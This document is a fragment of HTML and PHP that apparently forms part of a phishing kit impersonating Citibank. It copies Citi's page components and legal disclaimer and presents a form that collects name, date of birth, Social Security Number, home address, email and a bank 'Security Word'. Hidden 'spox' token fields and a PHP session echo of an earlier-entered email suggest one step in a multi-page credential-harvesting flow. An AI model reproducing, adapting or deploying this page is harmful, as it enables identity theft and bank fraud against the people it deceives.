                  <div class="form-group col-sm-4 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">First name</label><input type="text" name="firstname" maxlength="25" value="" id="firstname" class="form-control" aria-required="true" data-validation="length" data-validation-error-msg="First name is required." data-validation-length="min2" size="43" placeholder="First name">       
                  </div>
                  
                  
                  
                  <div class="form-group col-sm-4 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">Last name</label><input type="text" name="lastname" maxlength="25" value="" id="lastname" class="form-control" aria-required="true" data-validation="length" data-validation-error-msg="Last name is required." data-validation-length="min2" size="43" placeholder="Last name">       
                  </div>
                  
                  
              </div>
               <div class="row">
                  
                  <div class="form-group col-sm-4 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">Date of Birth</label><input _ngcontent-pqt-c104="" aria-label="Date of Birth" aria-labelledby="dateOfBirthlabel" type="tel" name="dateOfBirth" id="dateOfBirth" placeholder="Date of Birth" maxlength="10" aria-required="true" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" data-order-appearance="2" masked="true" data-validation="length" data-validation-error-msg="Date of birth (MM/DD/YYYY) is required." data-validation-length="min10" im-insert="true">      
                  </div>
                  
                  
                  
                  <div class="form-group col-sm-4 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">Social Security Number</label><input _ngcontent-qhm-c104="" aria-label="Social Security Number" aria-labelledby="ssnlabel" type="tel" name="ssn" id="ssn" placeholder="Social Security Number" maxlength="11" aria-required="true" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" data-order-appearance="3" data-validation="length" data-validation-error-msg="Enter a Social Security Number (XXX-XX-XXXX)." data-validation-length="min11" im-insert="true">
                  </div>
                  
                  
              </div>
              
<div class="row" style="font-size: 1rem;font-weight: 600;color: #414042;margin-bottom: .75rem;margin-top: .75rem;"><div class="col-xs-12 col-sm-6"><div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">Home address</div></div></div>

              <div class="row">
                  
                  <div class="form-group col-sm-4 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">Street address</label><input type="text" maxlength="25" value="" name="street" id="" class="form-control" aria-required="true" placeholder="Street address" data-order-appearance="3" data-validation="length" data-validation-error-msg="Doesn't match our records." data-validation-length="min4">       
                  </div>
                  
                  
                  <div class=" form-group col-sm-4 col-xs-12" id=""> 
                      <label for="propState" id="propStateLabel" class="text-input-label">State</label>
                      
<select name="state" id="propState" class="form-control" aria-required="true" placeholder="State">
    <option value="Select One" disabled="disabled">State</option>
    <option value="AL">Alabama (AL)</option>
    <option value="AK">Alaska (AK)</option>
    <option value="AZ">Arizona (AZ)</option>
    <option value="AR">Arkansas (AR)</option>
    <option value="CA">California (CA)</option>
    <option value="CO">Colorado (CO)</option>
    <option value="CT">Connecticut (CT)</option>
    <option value="DE">Delaware (DE)</option>
    <option value="DC">District of Columbia (DC)</option>
    <option value="FL">Florida (FL)</option>
    <option value="GA">Georgia (GA)</option>
    <option value="HI">Hawaii (HI)</option>
    <option value="ID">Idaho (ID)</option>
    <option value="IL">Illinois (IL)</option>
    <option value="IN">Indiana (IN)</option>
    <option value="IA">Iowa (IA)</option>
    <option value="KS">Kansas (KS)</option>
    <option value="KY">Kentucky (KY)</option>
    <option value="LA">Louisiana (LA)</option>
    <option value="ME">Maine (ME)</option>
    <option value="MD">Maryland (MD)</option>
    <option value="MA">Massachusetts (MA)</option>
    <option value="MI">Michigan (MI)</option>
    <option value="MN">Minnesota (MN)</option>
    <option value="MS">Mississippi (MS)</option>
    <option value="MO">Missouri (MO)</option>
    <option value="MT">Montana (MT)</option>
    <option value="NE">Nebraska (NE)</option>
    <option value="NV">Nevada (NV)</option>
    <option value="NH">New Hampshire (NH)</option>
    <option value="NJ">New Jersey (NJ)</option>
    <option value="NM">New Mexico (NM)</option>
    <option value="NY">New York (NY)</option>
    <option value="NC">North Carolina (NC)</option>
    <option value="ND">North Dakota (ND)</option>
    <option value="OH">Ohio (OH)</option>
    <option value="OK">Oklahoma (OK)</option>
    <option value="OR">Oregon (OR)</option>
    <option value="PA">Pennsylvania (PA)</option>
    <option value="RI">Rhode Island (RI)</option>
    <option value="SC">South Carolina (SC)</option>
    <option value="SD">South Dakota (SD)</option>
    <option value="TN">Tennessee (TN)</option>
    <option value="TX">Texas (TX)</option>
    <option value="UT">Utah (UT)</option>
    <option value="VT">Vermont (VT)</option>
    <option value="VA">Virginia (VA)</option>
    <option value="WA">Washington (WA)</option>
    <option value="WV">West Virginia (WV)</option>
    <option value="WI">Wisconsin (WI)</option>
    <option value="WY">Wyoming (WY)</option>


</select>

        
                  </div>
              </div>
              
              <div class="row">
              <div class="form-group col-sm-4 col-xs-12" id="cty" style="display: none;"><label for="propCity" id="propCityLabel" class="text-input-label">City</label><input type="text" name="city" maxlength="25" value="" id="city" class="form-control" aria-required="true" placeholder="City">       
              </div>
                  
                  
                  
                  <div class="form-group col-md-3 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">Zip Code</label><input type="text" name="zipcode" maxlength="5" value="" id="zip" class="form-control" aria-required="true" pattern="[0-9]*" placeholder="Zip Code" onblur="getCity()" data-order-appearance="2" masked="true" data-validation="length" data-validation-error-msg="ZIP Code is required." data-validation-length="min5">       
              </div>
              
                 
                </div> 
                 
                 
   <div class="row" style="font-size: 1rem;font-weight: 600;color: #414042;margin-bottom: .75rem;margin-top: .75rem;"><div class="col-xs-12 col-sm-6"><div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">Contact info</div></div></div>              
                  
             <div class="row">
                  
                  <div class="form-group col-sm-4 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">Email address</label><input type="text" name="emailAddress" maxlength="54"  id="propCity" class="form-control" aria-required="true" data-validation="email" data-validation-error-msg="Email is required." size="43" placeholder="Email address" value="<?php  echo $_SESSION['emailAddress']; ?>">    
                  </div>
                  
                  
                  
                  <div class="form-group col-sm-4 col-xs-12"><label for="propCity" id="propCityLabel" class="text-input-label">Security Word</label><input _ngcontent-qhm-c104="" aria-label="Security Word" aria-labelledby="securityWordlabel" type="text" name="securityword" id="securityWord" placeholder="Security Word" maxlength="30" aria-required="true" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" data-order-appearance="3" data-validation="length" data-validation-error-msg="Security Word is required." data-validation-length="min1">
                  </div>
                  
                  
              </div>
              
             
              
              
              
              
 <citi-cta _ngcontent-ekd-c295="" type="primary" size="large" _nghost-ekd-c58="">
 
 
 
 
<button style="color: #fff;background-color: #056dae;border-width: 2px;border-style: solid;margin: 20px 20px 20px 0;min-width: 220px;position: relative;" class="jpui button focus util float right primary" id="NEXT" type="submit"><span class="label">Continue</span></button>
 
 
 
 <!----><!----><!----><!----></citi-cta><citi-cta _ngcontent-ekd-c295="" type="tertiary" bold="" _nghost-ekd-c58=""><!----><!----><!----><!----></citi-cta><!----></div>



        </div>
    </section></citi-radio-group></div>
    
<input type="hidden" name="token" value="spox1">
<input type="hidden" name="spox" value="spox2">



</form>


</citi-form-container></main></citi-simple-layout></app-account-type></citi-simple-layout></ng-component></div>
            
          
          
          
          

          
          
              <div class="row">
                  
              </div>





      </div>
  </div>  
  



      
    
</div><cds-ivr-modal _ngcontent-ekd-c274="" _nghost-ekd-c279=""><cds-modal-dialog _ngcontent-ekd-c279="" class="ivr-modal-container" _nghost-ekd-c263=""><div _ngcontent-ekd-c263="" cdsariahideouterdom=""><div _ngcontent-ekd-c263="" class="cds-modal cds-modal-fade" aria-hidden="true" style="display: none;"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-ekd-c263="" cdsfocustrap="" role="dialog" aria-modal="true" class="cds-modal-dialog"><div _ngcontent-ekd-c279="" class="cds-modal-dialog-centered"><div _ngcontent-ekd-c279="" class="cds-modal-content cds-modal-lg"><div _ngcontent-ekd-c279=""><button _ngcontent-ekd-c279="" type="button" aria-label="Close" class="cds-modal-close cds-close cds-warning-close"></button></div><div _ngcontent-ekd-c279="" class="cds-modal-header"><h4 _ngcontent-ekd-c279="" class="cds-modal-title"></h4></div><div _ngcontent-ekd-c279="" class="cds-modal-body"><p _ngcontent-ekd-c279=""></p><div _ngcontent-ekd-c279="" class="row"><div _ngcontent-ekd-c279="" class="col-xs-12 col-lg-6 dropdown"><form _ngcontent-ekd-c279="" novalidate="" class="ng-untouched ng-pristine ng-invalid has-validation-callback"><cds-form-field _ngcontent-ekd-c279="" class="cds-form-field"><div class="cds-form-field-infix cds-input-group"><!----></div></cds-form-field></form></div></div><!----><div _ngcontent-ekd-c279="" class="ivr-cta-wrapper row"><!----></div><!----></div><div _ngcontent-ekd-c279="" class="cds-modal-footer"><!----></div></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div><div _ngcontent-ekd-c263="" class="cds-modal-backdrop cds-modal-fade" style="display: none;"></div></div></cds-modal-dialog></cds-ivr-modal><citi-route-detector _ngcontent-ekd-c274=""></citi-route-detector></div><!----><!----><citi-footer _ngcontent-ekd-c247="" _nghost-ekd-c209=""><div _ngcontent-wwg-c206="" class="disclaimer"><div _ngcontent-wwg-c206="" class="content"><div _ngcontent-wwg-c206="" class="text"></br><p><strong>Important Legal Disclosures &amp; Information</strong></p><p>Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. It does not, and should not be construed as, an offer, invitation or solicitation of services to individuals outside of the United States.</p><p>Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all accounts, products, and services as well as pricing described here are available in all jurisdictions or to all customers. Your eligibility for a particular product and service is subject to a final determination by Citibank. Your country of citizenship, domicile, or residence, if other than the United States, may have laws, rules, and regulations that govern or affect your application for and use of our accounts, products and services, including laws and regulations regarding taxes, exchange and/or capital controls that you are responsible for following.</p><p>The products, account packages, promotional offers and services described in this website may not apply to customers of <a target="_blank" href="">International Personal Bank U.S.</a> in the Citigold<sup>速</sup> Private Client International, Citigold<sup>速</sup> International, Citi International Personal, Citi Global Executive Preferred, and Citi Global Executive Account Packages.</p></div></div></div></citi-footer>

</citi-parent-layout></cbol-core></app-root>





<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

 
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");
Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dateOfBirth");


</script>



<script>
document.getElementById("cty").style.display = "none" ; 
document.getElementById("ste").style.display = "none" ; 
function getCity(){
    var zipcode = document.getElementById("zip").value;
    var url = "https://zip.getziptastic.com/v2/US/" + zipcode;
    $.getJSON( url, function( data ){
        console.log(data);
        var cityname = data.city;
        document.getElementById("city").value = cityname;
        
        
    document.getElementById("cty").style.display = 'block';
    });
}
    
    
    
</script>



</body></html>

<?php
        


?>